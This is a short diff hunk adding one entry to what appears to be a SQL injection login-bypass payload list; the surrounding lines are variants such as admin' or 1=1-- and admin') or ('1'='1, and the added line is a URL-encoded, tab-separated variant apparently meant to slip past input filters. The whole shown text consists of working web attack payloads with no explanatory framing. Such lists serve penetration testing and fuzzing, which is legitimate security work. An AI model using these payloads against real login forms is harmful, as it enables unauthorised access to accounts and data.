@@ -18,6 +18,7 @@ admin' or 1=1--
 admin' or 1=1#
 admin' or 1=1/*
 admin' or 1=1 LIMIT 1--
+admin%27%09or%09%271%27%3D%271%09--
 admin') or ('1'='1
 admin') or ('1'='1'--
 admin') or ('1'='1'#
